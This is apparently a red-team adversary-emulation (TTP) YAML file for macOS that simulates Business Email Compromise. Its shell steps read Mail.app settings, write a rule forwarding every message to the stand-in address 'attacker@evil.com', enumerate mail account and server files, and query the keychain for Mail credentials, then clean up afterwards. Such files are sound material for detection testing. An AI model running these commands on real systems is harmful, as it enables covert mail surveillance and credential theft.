---
api_version: 2.0
uuid: 6fa08e3b-9c5d-7f2a-1e4b-8d6c9f3e2a1b
name: Business Email Compromise
authors:
  - mbhatt
description: |
  Performs Business Email Compromise (BEC) techniques by reading Mail.app
  configuration, creating mail forwarding rules via defaults write, enumerating
  mail account configurations from ~/Library/Mail, and inspecting mail server
  settings to establish persistent email surveillance.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1566 Phishing"
  subtechniques:
    - "T1566.002 Phishing: Spearphishing Link"

requirements:
  platforms:
    - os: darwin

args:
  - name: forward_to_address
    description: "Email address to forward intercepted emails to"
    type: string
    default: "attacker@evil.com"

steps:
  - name: read_mail_app_configuration
    description: Read current Mail.app rule configuration using defaults read
    inline: |
      mkdir -p /tmp/ttp_bec
      echo "[+] Reading Mail.app preferences..."
      defaults read com.apple.mail 2>/dev/null > /tmp/ttp_bec/mail_prefs.txt || echo "No Mail.app preferences found"
      echo "[+] Existing mail rules:"
      defaults read com.apple.mail SortOrder 2>/dev/null || echo "  No sort rules configured"
      echo ""
      echo "[+] Mail signature settings:"
      defaults read com.apple.mail SignatureIsRich 2>/dev/null || echo "  No signature settings found"
      echo ""
      echo "[+] Mail account count:"
      defaults read com.apple.mail MailAccounts 2>/dev/null | grep -c "AccountName" || echo "  0 accounts found"

  - name: create_mail_forwarding_rule
    description: Create a mail forwarding rule using defaults write
    inline: |
      echo "[+] Creating mail forwarding rule to {{ .Args.forward_to_address }}..."
      RULE_PLIST="/tmp/ttp_bec/bec_rule.plist"
      cat > "${RULE_PLIST}" << PLISTEOF
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
        <key>RuleName</key>
        <string>Auto-Forward</string>
        <key>RuleAction</key>
        <string>forward</string>
        <key>ForwardTo</key>
        <string>{{ .Args.forward_to_address }}</string>
        <key>Criteria</key>
        <array>
          <dict>
            <key>CriterionType</key>
            <string>AnyMessage</string>
          </dict>
        </array>
        <key>Enabled</key>
        <true/>
      </dict>
      </plist>
      PLISTEOF
      defaults write com.apple.mail TTP-BEC-ForwardRule -dict \
        RuleName "Auto-Forward" \
        ForwardTo "{{ .Args.forward_to_address }}" \
        RuleAction "forward" \
        Enabled -bool true
      echo "[+] Mail forwarding rule created"
      echo "[+] Verifying rule was written:"
      defaults read com.apple.mail TTP-BEC-ForwardRule

  - name: enumerate_mail_accounts
    description: Check for existing email account configurations in ~/Library/Mail
    inline: |
      echo "[+] Enumerating mail account directories..."
      if [ -d "${HOME}/Library/Mail" ]; then
        echo "[+] Mail directory structure:"
        ls -la "${HOME}/Library/Mail/" 2>/dev/null | head -20
        echo ""
        echo "[+] Mail account directories (V-series):"
        find "${HOME}/Library/Mail" -maxdepth 2 -name "*.mbox" -type d 2>/dev/null | head -10 || echo "  No mailbox directories found"
        echo ""
        echo "[+] Account info plists:"
        find "${HOME}/Library/Mail" -maxdepth 3 -name "AccountInfo.plist" 2>/dev/null | head -5 || echo "  No account info plists found"
      else
        echo "[-] ~/Library/Mail directory does not exist"
      fi
      echo ""
      echo "[+] Internet Accounts configuration:"
      defaults read com.apple.mail MailAccounts 2>/dev/null | grep -E "(AccountName|AccountType|Hostname|Username)" | head -20 || echo "  No mail accounts found in preferences"

  - name: inspect_mail_server_settings
    description: Enumerate mail accounts and their server settings
    inline: |
      echo "[+] Mail server configuration details:"
      defaults read com.apple.mail MailAccounts 2>/dev/null | grep -E "(Hostname|PortNumber|SSLEnabled|AuthScheme|ServerPath)" | head -20 || echo "  No server settings found"
      echo ""
      echo "[+] Internet accounts (system-level):"
      defaults read MobileMeAccounts 2>/dev/null | grep -E "(AccountID|AccountDescription)" | head -10 || echo "  No MobileMe/iCloud accounts configured"
      echo ""
      echo "[+] Checking for mail-related keychains:"
      security find-generic-password -s "Mail" 2>/dev/null | head -10 || echo "  No Mail keychain entries found (or access denied)"

  - name: verify_forwarding_rule_created
    description: Verify the forwarding rule was created and report findings
    inline: |
      echo "[+] Verification of BEC forwarding rule:"
      RULE_EXISTS=$(defaults read com.apple.mail TTP-BEC-ForwardRule 2>/dev/null)
      if [ -n "${RULE_EXISTS}" ]; then
        echo "[+] PASS: Forwarding rule exists in Mail.app preferences"
        echo "${RULE_EXISTS}"
      else
        echo "[-] FAIL: Forwarding rule not found"
      fi
      echo ""
      echo "[+] Summary of enumerated data saved to /tmp/ttp_bec/"
      ls -la /tmp/ttp_bec/
    cleanup:
      inline: |
        defaults delete com.apple.mail TTP-BEC-ForwardRule 2>/dev/null || true
        rm -rf /tmp/ttp_bec
        echo "[+] Cleanup: Forwarding rule removed and temp files deleted"

tests:
  - name: business_email_compromise_test
    dry_run: true
